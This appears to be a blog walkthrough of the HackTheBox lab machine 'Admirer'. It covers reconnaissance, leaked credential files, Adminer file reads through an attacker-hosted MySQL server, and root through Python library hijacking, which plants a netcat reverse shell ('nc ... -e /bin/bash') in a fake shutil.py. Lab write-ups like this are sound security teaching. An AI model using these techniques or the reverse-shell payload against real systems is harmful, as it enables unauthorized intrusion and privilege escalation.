---
title: "HackTheBox - Admirer Walkthrough"
date: 2020-05-07
author: Abhinav Gyawali
categories: [hackthebox]
tags: [linux, privesc, ftp]
---

# Recon

Starting off with an nmap scan. Let's see what's open.

```bash
export $ipaddress=10.10.10.187

ports=$(nmap -p- --min-rate=1000 -T4 $ipaddress | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//); nmap -A -p$ports $ipaddress -o nmap
````

```
# Nmap 7.80 scan initiated Thu May  7 16:46:04 2020 as: nmap -A -p21,22,80 -o nmap 10.10.10.187
Nmap scan report for 10.10.10.187
Host is up (0.31s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.12 (94%), Linux 3.13 (94%), Linux 3.16 (94%), Linux 3.18 (94%), Linux 3.8 - 3.11 (94%), Linux 4.8 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

We see that there are only 3 ports open. Let's have a quick look at the FTP server and then move on to the web server.

```bash
ftp 10.10.10.187
```

Trying an anonymous login, we see that it is disallowed. Maybe we can come back to this when we have some creds. Let's move on.

We see that there's an entry in the robots.txt file for `/admin-dir`. Let's download it:

```bash
wget http://10.10.10.187/robots.txt
cat robots.txt
```

```
User-agent: *
# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
Disallow: /admin-dir
```

Hmm, seems like we have a username, `"waldo"`.

Let's start some content discovery scans:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.10.187/FUZZ -ac
```

Looking at the source code of the website, we notice some directories:
`images/fulls/`, `images/thumbs/`, `assets/js/`, `assets/css/`.

Looking back at our content discovery scan, we see only `robots.txt`, which we already know about.

Let's try fuzzing the `/admin-dir` to see if we can find something there:

```bash
ffuf -w /usr/share/dirb/wordlists/big.txt -e .html,.php,.txt,/ -u http://10.10.10.187/admin-dir/FUZZ -t 500
```

We find two very interesting files: `contacts.txt` and `credentials.txt`. Let's download them:

```bash
wget http://10.10.10.187/admin-dir/contacts.txt
wget http://10.10.10.187/admin-dir/credentials.txt
```

### credentials.txt

```
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

### contacts.txt

```
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb

##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb

#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```

We now know the hostname of the machine. Add it to `/etc/hosts`:

```bash
vi /etc/hosts
10.10.10.187  admirer.htb
```

### FTP Access

```bash
ftp 10.10.10.187
# Login with ftpuser credentials
ftp> dir
ftp> get dump.sql
ftp> get html.tar.gz
ftp> quit
```

Extracting `html.tar.gz`:

```bash
mkdir html
cd html/
tar -xvf ../html.tar.gz
```

### Database Credentials in index.php

```php
$servername = "localhost";
$username = "waldo";
$password = "]F7jLHw:*G>UPrTo}~A\"d6b";
$dbname = "admirerdb";
```

Inside `w4ld0s_s3cr3t_d1r/credentials.txt`:

```
[Bank Account]
waldo.11
Ezy]m27}OREc$

[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01
```

In `utility-scripts/db_admin.php`:

```php
$servername = "localhost";
$username = "waldo";
$password = "Wh3r3_1s_w4ld0?";
```

Content discovery on `utility-scripts`:

```bash
ffuf -u http://10.10.10.187/utility-scripts/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 500 -e .php
```

Found `adminer.php` (PHP Adminer, a DB management tool).

### Adminer Exploitation

* Tried known credentials, access denied.
* Found Server-Side Request Forgery exploit (`searchsploit adminer`).
* Used local database on attacker machine:

```sql
create database admirerdb;
create user 'waldo'@'%' identified by 'Wh3r3_1s_w4ld0?';
grant all privileges on admirerdb.* to 'waldo'@'%';
flush privileges;
```

* Loaded local files via Adminer to get updated credentials:

```sql
create table test(data varchar(255));
load data local infile '../index.php'
into table test
fields terminated by "\n";
select * from test;
```

Updated credentials:

```php
$servername = "localhost";
$username = "waldo";
$password = "&<h5b~yK3F#{PaPB&dA}{H>";
$dbname = "admirerdb";
```

### SSH Access

```bash
ssh waldo@10.10.10.187
```

### Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

Output:

```
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

`/opt/scripts/admin_tasks.sh` calls `backup.py`:

```python
#!/usr/bin/python3
from shutil import make_archive

src = '/var/www/html/'
dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```

* Used Python Library Hijacking to escalate privileges:

```bash
waldo@admirer:~$ echo "import os" > shutil.py
waldo@admirer:~$ echo "os.system('nc 10.10.14.14 4444 -e /bin/bash')" >> shutil.py
sudo -E PYTHONPATH=$(pwd) /opt/scripts/admin_tasks.sh
```

Reverse shell received.

### Root Access

```bash
whoami
# root
id
# uid=0(root) gid=0(root) groups=0(root)
hostname
# admirer
```

**Rooted!**
